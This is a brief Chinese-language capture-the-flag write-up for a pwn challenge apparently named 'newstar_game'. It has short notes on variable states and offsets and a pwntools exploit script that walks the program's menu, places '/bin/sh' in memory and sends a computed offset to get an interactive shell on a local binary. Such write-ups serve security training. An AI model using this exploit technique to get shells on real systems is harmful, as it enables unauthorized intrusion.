v6 = 1; v4=2; 输入/bin/sh同时使v6 = 0;

v4 = 1;反复0x16003次,泄露system地址获取libc以及使v7为合适的调用的偏移量

v4 = 3;跳转到最外层循环

v3 = 0x2190

exp：

```
from pwn import *

context(log_level='debug', os='linux', arch='amd64')

io = process('/home/kali/Desktop/newstar_game')
libc = ELF('/home/kali/Desktop/libc/libc-2.31.so')

io.sendafter('请选择你的伙伴'.encode(encoding='utf-8') , b'1\n')
io.sendafter('2.扣2送kfc联名套餐'.encode(encoding='utf-8') , b'2\n')
io.sendafter('你有什么想对肯德基爷爷说的吗?'.encode(encoding='utf-8') , b'/bin/sh\00')

for i in range(0x3):
    io.sendafter('2.扣2送kfc联名套餐'.encode(encoding='utf-8') , b'1\n')

io.sendafter('2.扣2送kfc联名套餐'.encode(encoding='utf-8') , b'3\n')
io.sendafter(b'you are good mihoyo player!',b'8592\n')

io.interactive()
```

根本不需要泄露system的地址，只需要经历一次，把v8改为1就行了，最后只有v7为0x30000时这个偏移恰好在v3（short）的范围内
